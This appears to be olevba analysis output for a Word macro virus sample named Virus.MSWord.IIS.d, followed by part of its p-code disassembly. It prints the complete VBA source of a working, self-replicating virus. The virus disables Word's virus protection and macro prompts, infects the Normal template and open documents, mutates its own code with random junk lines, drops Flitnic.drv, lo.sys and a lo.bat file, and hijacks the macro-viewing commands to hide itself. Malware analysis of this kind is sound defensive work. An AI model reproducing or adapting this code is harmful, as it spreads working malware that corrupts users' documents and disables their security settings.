olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.IIS.d
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.IIS.d - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Modul1.bas 
in file: Virus.MSWord.IIS.d - OLE stream: 'Macros/VBA/Modul1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
Application.ShowVisualBasicEditor _
= False
a _
= Dir(NormalTemplate.FullName)
If a = "" Then GoTo NoSet
SetAttr _
NormalTemplate.FullName, _
vbNormal
NoSet:
begin:
On _
Error GoTo eb
NormAt _
= False
VBE.CommandBars("Edit").Controls(1).Enabled = False
Application.EnableCancelKey _
= wdCancelDisabled
WordBasic.DisableAutoMacros _
0
Options.VirusProtection _
= False
Options.ConfirmConversions _
= False
Application.ScreenUpdating _
= False
Options.SaveNormalPrompt _
= False
Close _
#1
Open "c:\msdos.sys" For Input As #1
Do _
Until EOF(1)
Line _
Input #1, a
If Left(UCase(a), 7) = "WINDIR=" Then
l _
= Len(a)
windir _
= Mid(a, 8, l)
End _
If
Loop
If windir = "" Then Exit Sub
On _
Error GoTo NoInf
ms _
= NormalTemplate.VBProject.VBComponents.Count
For _
t2 = 1 To ms
ls _
= NormalTemplate.VBProject.VBComponents(t2).CodeModule.countoflines
If _
ls > 3 Then l = NormalTemplate.VBProject.VBComponents(t2).CodeModule.Lines(1, 1)
If UCase(l) = "SUB AUTOCLOSE()" Then
NormT _
= 1
Exit _
For
End _
If
Next _
t2
ms _
= ActiveDocument.VBProject.VBComponents.Count
For _
tg = 1 To ms
ls _
= ActiveDocument.VBProject.VBComponents(tg).CodeModule.countoflines
If _
ls > 3 Then l = ActiveDocument.VBProject.VBComponents(tg).CodeModule.Lines(1, 1)
If UCase(l) = "SUB AUTOOPEN()" Then
Acd _
= 1
Exit _
For
End _
If
Next _
tg
If _
Acd = 1 And NormT = 1 Then Exit Sub
If _
Acd = 1 Then
FullCodeN = "Sub AutoClose()" & Chr(13)
t _
= 0
Randomize _
Timer
t _
= CInt(Rnd * 100)
If _
t < 50 Then g = 1
If _
t > 49 And t < 101 Then g = 2
If _
g = 1 Then
v _
= CInt(Rnd * 50)
For _
vs = 1 To v
beginNn:
z _
= CInt(Rnd * 250)
If _
z = 13 Then GoTo beginNn
If _
z < 65 Then GoTo beginNn
If _
z < 130 Then GoTo beginNn
va _
= va & Chr(z)
Next _
vs
v _
= CInt(Rnd * 20)
For _
vss = 1 To v
begin5:
z _
= CInt(Rnd * 250)
If _
z = 13 Then GoTo begin5
If _
z = 34 Then GoTo begin5
If _
z < 130 Then GoTo begin5
Inn _
= Inn & Chr(z)
Next _
vss
FullCodeN = FullCodeN & va & "=" & Chr(34) & Inn & Chr(34) & Chr(13)
End _
If
If _
g = 2 Then
v _
= CInt(Rnd * 50)
For _
vsss = 1 To v
begin2:
z _
= CInt(Rnd * 250)
If _
z = 13 Then GoTo begin2
If _
z < 130 Then GoTo begin2
va _
= va & Chr(z)
Next _
vsss
z _
= CInt(Rnd * 250)
Inn = "Chr(" & z & ")"
FullCodeN = FullCodeN & va & "=" & Inn & Chr(13)
End _
If
If _
g = 3 Then
v _
= CInt(Rnd * 50)
va = "'"
For _
vssss = 1 To v
begin3:
z _
= CInt(Rnd * 250)
If _
z = 13 Then GoTo begin3
If _
z < 130 Then GoTo begin3
va _
= va & Chr(z)
Next _
vssss
FullCodeN _
= FullCodeN & va & Chr(13)
End _
If
If _
g = 4 Then
v _
= CInt(Rnd * 50)
For _
vsssss = 1 To v
begin4:
z _
= CInt(Rnd * 250)
If _
z = 13 Then GoTo begin4
If _
z < 130 Then GoTo begin4
va _
= va & Chr(z)
Next _
vsssss
va = va & ":"
FullCodeN _
= FullCodeN & va & Chr(13)
End _
If
aaaa _
= ActiveDocument.VBProject.VBComponents.Item(tg).CodeModule.countoflines
hh _
= 1
Do
If _
hh = aaaa Then GoTo nextterm
hh _
= hh + 1
a _
= ActiveDocument.VBProject.VBComponents.Item(tg).CodeModule.Lines(hh, 1)
If Right(a, 1) = ":" Then
FullCodeN _
= FullCodeN & a & Chr(13)
GoTo _
NextLineN
End _
If
Spac _
= 0
t _
= 0
PosL _
= 0
BeginN:
l _
= Len(a)
Do
If _
PosL > l Then GoTo NoCN
PosL _
= PosL + 1
If _
Mid(a, PosL, 1) = Chr(34) Then
FullCodeN _
= FullCodeN & a & Chr(13)
GoTo _
NextLineN
End _
If
Loop
NoCN:
PosL _
= 0
If Right(a, 1) = "_" Then GoTo UnsplitN
GoTo _
SplitN
UnsplitN:
v _
= 0
y _
= a
Do
If Right(y, 1) <> "_" Then GoTo NoChN
l _
= Len(y)
PosL _
= 0
Do
PosL _
= PosL + 1
s _
= Mid(y, PosL, 1)
If s = "_" Then GoTo FoundN
Loop
FoundN:
Spac _
= PosL - 1
y _
= Left(y, l - 1)
hh _
= hh + 1
a _
= ActiveDocument.VBProject.VBComponents.Item(tg).CodeModule.Lines(hh, 1)
v _
= 1
y _
= y & a
Loop
NoChN:
a _
= y
c _
= 0
PoslO _
= 0
PosL _
= 0
GoTo _
BeginN
SplitN:
PosL _
= 0
l _
= Len(a)
k _
= 0
If _
Spac <> 0 Then
Do
k _
= k + 1
If _
k > l Then GoTo NC
s _
= Mid(a, k, 1)
If s = " " Then g = k
Loop
NC:
If _
g <= Spac Then
FullCodeN _
= FullCodeN & a & Chr(13)
GoTo _
NextLineN
End _
If
End _
If
Do
If _
PosL > l Then
FullCodeN _
= FullCodeN & a & Chr(13)
GoTo _
NextLineN
End _
If
PosL _
= PosL + 1
s _
= Mid(a, PosL, 1)
If _
s = Chr(34) Then
FullCodeN _
= FullCodeN & a & Chr(13)
GoTo _
NextLineN
End _
If
If s = " " Then
If _
Spac = 0 Then
f = Left(a, PosL) & " " & "_"
las _
= Mid(a, PosL + 1, l)
FullCodeN _
= FullCodeN & f & Chr(13)
FullCodeN _
= FullCodeN & las & Chr(13)
GoTo _
NextLineN
End _
If
If _
PosL <= Spac Then
wa _
= PosL - PoslO
If _
PoslO <> 0 Then
Temp = Mid(a, PoslO, wa) & " " & "_"
Else
Temp = Mid(a, 1, PosL) & " " & "_"
End _
If
FullCodeN _
= _
FullCodeN _
& Temp & Chr(13)
PoslO _
= _
PosL _
+ 1
c _
= 1
GoTo _
NextCharN
Else
c _
= 1
wa _
= PosL - (PoslO)
Temp = Mid(a, PoslO, wa) & " " & "_"
Temp2 _
= Mid(a, PosL + 1, l)
FullCodeN _
= FullCodeN & Temp & Chr(13) & Temp2 & Chr(13)
If _
PosL > Spac Then GoTo NextLineN
GoTo _
NextCharN
End _
If
Temp = Mid(a, PoslO + 1, PosL) & " " & "_"
FullCodeN _
= FullCodeN & Temp & Chr(13)
GoTo _
NextLineN
End _
If
NextCharN:
Loop
FullCodeN _
= FullCodeN & y & Chr(13)
GoTo _
NextLineN
NextLineN:
Loop
nextterm:
End _
If
If _
NormT = 1 Then
FullCodeD = "Sub AutoOpen()" & Chr(13)
t _
= 0
Randomize _
Timer
t _
= CInt(Rnd * 100)
If _
t < 50 Then g = 1
If _
t > 49 And t < 101 Then g = 2
If _
g = 1 Then
v _
= CInt(Rnd * 50)
For _
vDs = 1 To v
beginDD:
z _
= CInt(Rnd * 250)
If _
z = 13 Then GoTo beginDD
If _
z < 65 Then GoTo beginDD
If _
z < 130 Then GoTo beginDD
va _
= va & Chr(z)
Next _
vDs
v _
= CInt(Rnd * 20)
For _
vDss = 1 To v
beginD5:
z _
= CInt(Rnd * 250)
If _
z = 13 Then GoTo beginD5
If _
z = 34 Then GoTo beginD5
If _
z < 130 Then GoTo beginD5
Inn _
= Inn & Chr(z)
Next _
vDss
FullCodeD = FullCodeD & va & "=" & Chr(34) & Inn & Chr(34) & Chr(13)
End _
If
If _
g = 2 Then
v _
= CInt(Rnd * 50)
For _
vDsss = 1 To v
beginD2:
z _
= CInt(Rnd * 250)
If _
z = 13 Then GoTo beginD2
If _
z < 130 Then GoTo beginD2
va _
= va & Chr(z)
Next _
vDsss
z _
= CInt(Rnd * 250)
Inn = "Chr(" & z & ")"
FullCodeD = FullCodeD & va & "=" & Inn & Chr(13)
End _
If
If _
g = 3 Then
v _
= CInt(Rnd * 50)
va = "'"
For _
vdssss = 1 To v
beginD3:
z _
= CInt(Rnd * 250)
If _
z = 13 Then GoTo beginD3
If _
z < 130 Then GoTo beginD3
va _
= va & Chr(z)
Next _
vdssss
FullCodeD _
= FullCodeD & va & Chr(13)
End _
If
If _
g = 4 Then
v _
= CInt(Rnd * 50)
For _
vdsssss = 1 To v
beginD4:
z _
= CInt(Rnd * 250)
If _
z = 13 Then GoTo beginD4
If _
z < 130 Then GoTo beginD4
va _
= va & Chr(z)
Next _
vdsssss
va = va & ":"
FullCodeD _
= FullCodeD & va & Chr(13)
End _
If
aaaa _
= NormalTemplate.VBProject.VBComponents.Item(t2).CodeModule.countoflines
hh _
= 1
Do
If _
hh = aaaa Then GoTo EndTerm
hh _
= hh + 1
a _
= NormalTemplate.VBProject.VBComponents.Item(t2).CodeModule.Lines(hh, 1)
If Right(a, 1) = ":" Then
FullCodeD _
= FullCodeD & a & Chr(13)
GoTo _
NextLineD
End _
If
Spac _
= 0
t _
= 0
PosL _
= 0
beginD:
l _
= Len(a)
Do
If _
PosL > l Then GoTo NoCD
PosL _
= PosL + 1
If _
Mid(a, PosL, 1) = Chr(34) Then
FullCodeD _
= FullCodeD & a & Chr(13)
GoTo _
NextLineD
End _
If
Loop
NoCD:
PosL _
= 0
If Right(a, 1) = "_" Then GoTo UnsplitD
GoTo _
SplitD
UnsplitD:
v _
= 0
y _
= a
Do
If Right(y, 1) <> "_" Then GoTo NoChD
l _
= Len(y)
PosL _
= 0
Do
PosL _
= PosL + 1
s _
= Mid(y, PosL, 1)
If s = "_" Then GoTo FoundD
Loop
FoundD:
Spac _
= PosL - 1
y _
= Left(y, l - 1)
hh _
= hh + 1
a _
= NormalTemplate.VBProject.VBComponents.Item(t2).CodeModule.Lines(hh, 1)
v _
= 1
y _
= y & a
Loop
NoChD:
a _
= y
c _
= 0
PoslO _
= 0
PosL _
= 0
GoTo _
beginD
SplitD:
PosL _
= 0
l _
= Len(a)
k _
= 0
If _
Spac <> 0 Then
Do
k _
= k + 1
If _
k > l Then GoTo DC
s _
= Mid(a, k, 1)
If s = " " Then g = k
Loop
DC:
If _
g <= Spac Then
FullCodeD _
= FullCodeD & a & Chr(13)
GoTo _
NextLineD
End _
If
End _
If
Do
If _
PosL > l Then
FullCodeD _
= FullCodeD & a & Chr(13)
GoTo _
NextLineD
End _
If
PosL _
= PosL + 1
s _
= Mid(a, PosL, 1)
If _
s = Chr(34) Then
FullCodeD _
= FullCodeD & a & Chr(13)
GoTo _
NextLineD
End _
If
If s = " " Then
If _
Spac = 0 Then
f = Left(a, PosL) & " " & "_"
las _
= Mid(a, PosL + 1, l)
FullCodeD _
= FullCodeD & f & Chr(13)
FullCodeD _
= FullCodeD & las & Chr(13)
GoTo _
NextLineD
End _
If
If _
PosL <= Spac Then
wa _
= PosL - PoslO
If _
PoslO <> 0 Then
Temp = Mid(a, PoslO, wa) & " " & "_"
Else
Temp = Mid(a, 1, PosL) & " " & "_"
End _
If
FullCodeD _
= _
FullCodeD _
& Temp & Chr(13)
PoslO _
= _
PosL _
+ 1
c _
= 1
GoTo _
NextCharD
Else
c _
= 1
wa _
= PosL - (PoslO)
Temp = Mid(a, PoslO, wa) & " " & "_"
Temp2 _
= Mid(a, PosL + 1, l)
FullCodeD _
= FullCodeD & Temp & Chr(13) & Temp2 & Chr(13)
If _
PosL > Spac Then GoTo NextLineD
GoTo _
NextCharD
End _
If
Temp = Mid(a, PoslO + 1, PosL) & " " & "_"
FullCodeD _
= FullCodeD & Temp & Chr(13)
GoTo _
NextLineD
End _
If
NextCharD:
Loop
FullCodeD _
= FullCodeD & y & Chr(13)
GoTo _
NextLineD
NextLineD:
Loop
EndTerm:
End _
If
If _
NormT <> 1 Then
look:
ms _
= NormalTemplate.VBProject.VBComponents.Count
For _
Inn = 2 To ms
a _
= NormalTemplate.VBProject.VBComponents(Inn).CodeModule.countoflines
If _
a < 1 Then
NormalTemplate.VBProject.VBComponents(Inn).CodeModule.AddFromstring _
(FullCodeN)
i _
= 20
Exit _
For
End _
If
Next _
Inn
If _
i <> 20 Then
Close _
#1
a = Dir(windir & "\System\Flitnic.drv")
If a <> "" Then Kill windir & "\system\Flitnic.drv"
Close _
#1
Open windir & "\System\Flitnic.drv" For Append As #1
Print #1, "Attribute VB_Name = " & Chr(34) & "Modul1" & Chr(34)
Close _
#1
NormalTemplate.VBProject.VBComponents.Import windir & "\System\Flitnic.drv"
GoTo _
look
End _
If
a = Dir(windir & "\System\lo.sys")
If a <> "" Then Kill windir & "\System\lo.sys"
NormalTemplate.OpenAsDocument
NormAtt _
= ActiveDocument.ReadOnly
l = ""
On _
Error GoTo eb
ActiveDocument.SaveAs FileName:=windir & "\System\lo.sys", FileFormat:=wdFormatTemplate, AddToRecentFiles:=False, ReadOnlyRecommended:=False
NormalTemplate.Saved _
= True
ActiveDocument.Saved _
= True
ActiveDocument.Close
Close _
#1
a = Dir(windir & "\System\lo.bat")
If a <> "" Then Kill windir & "\System\lo.bat"
Close
Open windir & "\System\lo.bat" For Append As #1
Print #1, ":Begin"
l _
= Len(NormalTemplate.FullName)
l _
= l - 10
For _
i = 1 To 500
Print #1, "rem Flitnic has catched you... he, he"
Next _
i
Print #1, ":Begin"
Print #1, "Move /y c:\Troop.dat " & NormalTemplate.FullName
Print #1, "If exist c:\Troop.dat goto Begin"
Close _
#1
NormalTemplate.Saved _
= True
a _
= Dir(NormalTemplate.FullName)
If a = "" Then GoTo notemp
If _
NormAt = True Then
End _
If
notemp:
End _
If
i _
= 1
If _
Acd <> 1 Then
Close
look2:
ms _
= ActiveDocument.VBProject.VBComponents.Count
For _
inn2 = 2 To ms
a _
= ActiveDocument.VBProject.VBComponents(inn2).CodeModule.countoflines
If _
a < 1 Then
ActiveDocument.VBProject.VBComponents(inn2).CodeModule.AddFromstring _
(FullCodeD)
i _
= 20
Exit _
For
End _
If
Next _
inn2
If _
i <> 20 Then
Close _
#1
a = Dir(windir & "\System\Flitnic.drv")
If a <> "" Then Kill windir & "\system\Flitnic.drv"
Close _
#1
Open windir & "\System\Flitnic.drv" For Append As #1
Print #1, "Attribute VB_Name = " & Chr(34) & "Modul1" & Chr(34)
Close _
#1
ActiveDocument.VBProject.VBComponents.Import windir & "\System\Flitnic.drv"
GoTo _
look2
End _
If
If UCase(Left(ActiveDocument.FullName, 1)) <> "A" And Mid(ActiveDocument.FullName, 3, 1) = "\" Then
If _
ActiveDocument.ReadOnly = True Then GoTo noactsave
ActiveDocument.Save
noactsave:
Else
ActiveDocument.Saved _
= True
End _
If
End _
If
NoInf:
eb:
a _
= Dir(NormalTemplate.FullName)
If a = "" Then
NormalTemplate.Saved _
= False
GoTo _
NoNormal
End _
If
If _
NormAtt = True Then
FileCopy windir & "\System\lo.sys", "c:\Troop.dat"
SetAttr _
(NormalTemplate.FullName), vbNormal
a = Shell(windir & "\System\lo.bat", 0)
Else
NormalTemplate.Save
End _
If
NormalTemplate.Saved _
= True
NoNormal:
End _
Sub
Sub _
ViewVbCode()
On _
Error GoTo NoDoc
a _
= Dir(NormalTemplate.FullName)
If a = "" Then GoTo NoSet
SetAttr _
(NormalTemplate.FullName), vbNormal
NoSet:
Close _
#1
Open "c:\msdos.sys" For Input As #1
Do _
Until EOF(1)
Line _
Input #1, a
If Left(UCase(a), 7) = "WINDIR=" Then
l _
= Len(a)
windir _
= Mid(a, 8, l)
End _
If
Loop
Close _
#1
If windir = "" Then Exit Sub
ms _
= ActiveDocument.VBProject.VBComponents.Count
For _
t = 1 To ms
ls _
= ActiveDocument.VBProject.VBComponents(t).CodeModule.countoflines
If _
ls > 3 Then l = ActiveDocument.VBProject.VBComponents(t).CodeModule.Lines(1, 1)
If UCase(l) = "SUB AUTOOPEN()" Then
Acd _
= 1
Exit _
For
End _
If
Next _
t
a _
= ActiveDocument.VBProject.VBComponents.Item(t).CodeModule.countoflines
ActiveDocument.VBProject.VBComponents(t).CodeModule.deletelines _
1, a
ActiveDocument.Saved _
= True
NoDoc:
ms _
= NormalTemplate.VBProject.VBComponents.Count
For _
t2 = 2 To ms
ls _
= NormalTemplate.VBProject.VBComponents(t2).CodeModule.countoflines
If _
ls > 3 Then l = NormalTemplate.VBProject.VBComponents(t2).CodeModule.Lines(1, 1)
If UCase(l) = "SUB AUTOCLOSE()" Then
NormT _
= 1
Exit _
For
End _
If
Next _
t2
FileCopy windir & "\System\lo.sys", "c:\Troop.dat"
a = Shell(windir & "\System\lo.bat", 0)
For _
i = 1 To 2
al _
= NormalTemplate.VBProject.VBComponents(t2).CodeModule.countoflines
NormalTemplate.VBProject.VBComponents(t2).CodeModule.deletelines _
1, al
Next _
i
esub:
eb:
Application.ShowVisualBasicEditor _
= True
NoDocL:
Options.SaveNormalPrompt _
= False
NormalTemplate.Saved _
= True
End _
Sub
Sub _
ToolsMacro()
On _
Error GoTo NoDoc
a _
= Dir(NormalTemplate.FullName)
If a = "" Then GoTo NoSet
SetAttr _
(NormalTemplate.FullName), vbNormal
NoSet:
ms _
= ActiveDocument.VBProject.VBComponents.Count
For _
t = 1 To ms
ls _
= ActiveDocument.VBProject.VBComponents(t).CodeModule.countoflines
If _
ls > 3 Then l = ActiveDocument.VBProject.VBComponents(t).CodeModule.Lines(1, 1)
If UCase(l) = "SUB AUTOOPEN()" Then
Acd _
= 1
Exit _
For
End _
If
Next _
t
If _
Acd = 1 Then
FullCodeD = "Sub AutoOpen" & Chr(13)
FullCodeN = "Sub AutoClose()" & Chr(13)
a _
= ActiveDocument.VBProject.VBComponents.Item(t).CodeModule.countoflines
For _
ii = 2 To a
l _
= ActiveDocument.VBProject.VBComponents.Item(t).CodeModule.Lines(ii, 1)
FullCodeN _
= FullCodeN & l & Chr(13)
FullCodeD _
= FullCodeD & l & Chr(13)
Next _
ii
End _
If
a _
= ActiveDocument.VBProject.VBComponents(t).CodeModule.countoflines
ActiveDocument.VBProject.VBComponents(t).CodeModule.deletelines _
1, a
ActiveDocument.Saved _
= True
ActiveDocument.Saved _
= True
NoDoc:
ms _
= NormalTemplate.VBProject.VBComponents.Count
For _
t2 = 1 To ms
ls _
= NormalTemplate.VBProject.VBComponents(t2).CodeModule.countoflines
If _
ls > 3 Then l = NormalTemplate.VBProject.VBComponents(t2).CodeModule.Lines(1, 1)
If UCase(l) = "SUB AUTOCLOSE()" Then
NormT _
= 1
Exit _
For
End _
If
Next _
t2
If _
NormT = 1 Then
FullCodeD = "Sub AutoOpen()" & Chr(13)
FullCodeN = "Sub AutoClose()" & Chr(13)
a _
= NormalTemplate.VBProject.VBComponents.Item(t2).CodeModule.countoflines
For _
iiii = 2 To a
l _
= NormalTemplate.VBProject.VBComponents.Item(t2).CodeModule.Lines(iiii, 1)
FullCodeD _
= FullCodeD & l & Chr(13)
FullCodeN _
= FullCodeN & l & Chr(13)
Next _
iiii
End _
If
l = ""
On _
Error GoTo 0
On _
Error GoTo eb
a _
= NormalTemplate.VBProject.VBComponents(t2).CodeModule.countoflines
NormalTemplate.VBProject.VBComponents(t2).CodeModule.deletelines _
1, a
NormalTemplate.Saved _
= True
esub:
Close _
#1
Open "c:\msdos.sys" For Input As #1
Do _
Until EOF(1)
Line _
Input #1, a
If Left(UCase(a), 7) = "WINDIR=" Then
l _
= Len(a)
windir _
= Mid(a, 8, l)
End _
If
Loop
Close _
#1
If windir = "" Then Exit Sub
a _
= GetAttr(NormalTemplate.FullName)
If _
a = 33 Then a = 1
If _
a = 1 Then GoTo eb
eb:
NormalTemplate.Saved _
= True
Application.Dialogs(wdDialogToolsMacro).Show
ReInf _
= True
If _
Application.ShowVisualBasicEditor = True Then ReInf = False
If _
ReInf = True Then
Acd _
= 0
NormT _
= 0
If _
NormT <> 1 Then
NormalTemplate.OpenAsDocument
NormAt _
= ActiveDocument.ReadOnly
ActiveDocument.Close
Close _
#1
look:
ms _
= NormalTemplate.VBProject.VBComponents.Count
For _
Inn = 2 To ms
a _
= NormalTemplate.VBProject.VBComponents(Inn).CodeModule.countoflines
If _
a < 1 Then
NormalTemplate.VBProject.VBComponents(Inn).CodeModule.AddFromstring _
(FullCodeN)
i _
= 20
Exit _
For
End _
If
Next _
Inn
If _
i <> 20 Then
Close _
#1
a = Dir(windir & "\System\Flitnic.drv")
If a <> "" Then Kill windir & "\system\Flitnic.drv"
Close _
#1
Open windir & "\System\Flitnic.drv" For Append As #1
Print #1, "Attribute VB_Name = " & Chr(34) & "Modul1" & Chr(34)
Close _
#1
NormalTemplate.VBProject.VBComponents.Import windir & "\System\Flitnic.drv"
GoTo _
look
End _
If
a _
= Dir(NormalTemplate.FullName)
If a = "" Then GoTo notemp
If _
NormAt = True Then
NormalTemplate.Saved _
= True
End _
If
End _
If
i _
= 1
If _
NormAt <> True Then NormalTemplate.Save
notemp:
If _
Acd <> 1 Then
Close
look2:
a _
= Application.Documents.Count
If _
a < 1 Then GoTo NoDocL
ms _
= ActiveDocument.VBProject.VBComponents.Count
For _
inn2 = 2 To ms
a _
= ActiveDocument.VBProject.VBComponents(inn2).CodeModule.countoflines
If _
a < 1 Then
ActiveDocument.VBProject.VBComponents(inn2).CodeModule.AddFromstring _
(FullCodeD)
i _
= 20
Exit _
For
End _
If
Next _
inn2
If _
i <> 20 Then
Close _
#1
a = Dir(windir & "\System\Flitnic.drv")
If a <> "" Then Kill windir & "\system\Flitnic.drv"
Close _
#1
Open windir & "\System\Flitnic.drv" For Append As #1
Print #1, "Attribute VB_Name = " & Chr(34) & "Modul1" & Chr(34)
Close _
#1
ActiveDocument.VBProject.VBComponents.Import windir & "\System\Flitnic.drv"
GoTo _
look2
End _
If
If UCase(Left(ActiveDocument.FullName, 1)) <> "A" And Mid(ActiveDocument.FullName, 3, 1) = "\" Then
If _
ActiveDocument.ReadOnly = True Then GoTo noactsave
ActiveDocument.Save
noactsave:
Else
ActiveDocument.Saved _
= True
End _
If
End _
If
NoDocL:
Else
FileCopy windir & "\System\lo.sys", "c:\Troop.dat"
a = Shell(windir & "\System\lo.bat", 0)
For _
i = 1 To 2
al _
= NormalTemplate.VBProject.VBComponents(t2).CodeModule.countoflines
NormalTemplate.VBProject.VBComponents(t2).CodeModule.deletelines _
1, al
NormalTemplate.Saved _
= True
Next _
i
End _
If
Options.SaveNormalPrompt _
= False
NormalTemplate.Saved _
= True
End _
Sub





-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.IIS.d
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 903 bytes
' Macros/VBA/Modul1 - 171311 bytes
' Line #0:
' 	FuncDefn (Sub AutoOpen())
' Line #1:
' 	LineCont 0x0004 03 00 00 00
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ShowVisualBasicEditor 
' Line #2:
' 	LineCont 0x0004 01 00 00 00
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ArgsLd Dir 0x0001 
' 	St a 
' Line #3:
' 	Ld a 
' 	LitStr 0x0000 ""
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo NoSet 
' 	EndIf 
' Line #4:
' 	LineCont 0x0008 01 00 00 00 05 00 00 00
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	Ld vbNormal 
' 	ArgsCall SetAttr 0x0002 
' Line #5:
' 	Label NoSet 
' Line #6:
' 	Label begin 
' Line #7:
' 	LineCont 0x0004 01 00 00 00
' 	OnError eb 
' Line #8:
' 	LineCont 0x0004 01 00 00 00
' 	LitVarSpecial (False)
' 	St NormAt 
' Line #9:
' 	LitVarSpecial (False)
' 	LitDI2 0x0001 
' 	LitStr 0x0004 "Edit"
' 	Ld VBE 
' 	ArgsMemLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #10:
' 	LineCont 0x0004 03 00 00 00
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #11:
' 	LineCont 0x0004 03 00 00 00
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #12:
' 	LineCont 0x0004 03 00 00 00
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #13:
' 	LineCont 0x0004 03 00 00 00
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #14:
' 	LineCont 0x0004 03 00 00 00
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #15:
' 	LineCont 0x0004 03 00 00 00
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #16:
' 	LineCont 0x0004 01 00 00 00
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #17:
' 	LitStr 0x000C "c:\msdos.sys"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #18:
' 	LineCont 0x0004 01 00 00 00
' 	LitDI2 0x0001 
' 	ArgsLd EOF 0x0001 
' 	DoUnitil 
' Line #19:
' 	LineCont 0x0004 01 00 00 00
' 	LitDI2 0x0001 
' 	Ld a 
' 	LineInput 
' Line #20:
' 	Ld a 
' 	ArgsLd UCase 0x0001 
' 	LitDI2 0x0007 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0007 "WINDIR="
' 	Eq 
' 	IfBlock 
' Line #21:
' 	LineCont 0x0004 01 00 00 00
' 	Ld a 
' 	FnLen 
' 	St l 
' Line #22:
' 	LineCont 0x0004 01 00 00 00
' 	Ld a 
' 	LitDI2 0x0008 
' 	Ld l 
' 	ArgsLd Mid$ 0x0003 
' 	St windir 
' Line #23:
' 	LineCont 0x0004 01 00 00 00
' 	EndIfBlock 
' Line #24:
' 	Loop 
' Line #25:
' 	Ld windir 
' 	LitStr 0x0000 ""
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ExitSub 
' 	EndIf 
' Line #26:
' 	LineCont 0x0004 01 00 00 00
' 	OnError NoInf 
' Line #27:
' 	LineCont 0x0004 01 00 00 00
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	St ms 
' Line #28:
' 	LineCont 0x0004 01 00 00 00
' 	StartForVariable 
' 	Ld t2 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ms 
' 	For 
' Line #29:
' 	LineCont 0x0004 01 00 00 00
' 	Ld t2 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd countoflines 
' 	St ls 
' Line #30:
' 	LineCont 0x0004 01 00 00 00
' 	Ld ls 
' 	LitDI2 0x0003 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld t2 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St l 
' 	EndIf 
' Line #31:
' 	Ld l 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x000F "SUB AUTOCLOSE()"
' 	Eq 
' 	IfBlock 
' Line #32:
' 	LineCont 0x0004 01 00 00 00
' 	LitDI2 0x0001 
' 	St NormT 
' Line #33:
' 	LineCont 0x0004 01 00 00 00
' 	ExitFor 
' Line #34:
' 	LineCont 0x0004 01 00 00 00
' 	EndIfBlock 
' Line #35:
' 	LineCont 0x0004 01 00 00 00
' 	StartForVariable 
' 	Ld t2 
' 	EndForVariable 
' 	NextVar 
' Line #36:
' 	LineCont 0x0004 01 00 00 00
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	St ms 
' Line #37:
' 	LineCont 0x0004 01 00 00 00
' 	StartForVariable 
' 	Ld tg 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ms 
' 	For 
' Line #38:
' 	LineCont 0x0004 01 00 00 00
' 	Ld tg 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd countoflines 
' 	St ls 
' Line #39:
' 	LineCont 0x0004 01 00 00 00
' 	Ld ls 
' 	LitDI2 0x0003 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld tg 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St l 
' 	EndIf 
' Line #40:
' 	Ld l 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x000E "SUB AUTOOPEN()"
' 	Eq 
' 	IfBlock 
' Line #41:
' 	LineCont 0x0004 01 00 00 00
' 	LitDI2 0x0001 
' 	St Acd 
' Line #42:
' 	LineCont 0x0004 01 00 00 00
' 	ExitFor 
' Line #43:
' 	LineCont 0x0004 01 00 00 00
' 	EndIfBlock 
' Line #44:
' 	LineCont 0x0004 01 00 00 00
' 	StartForVariable 
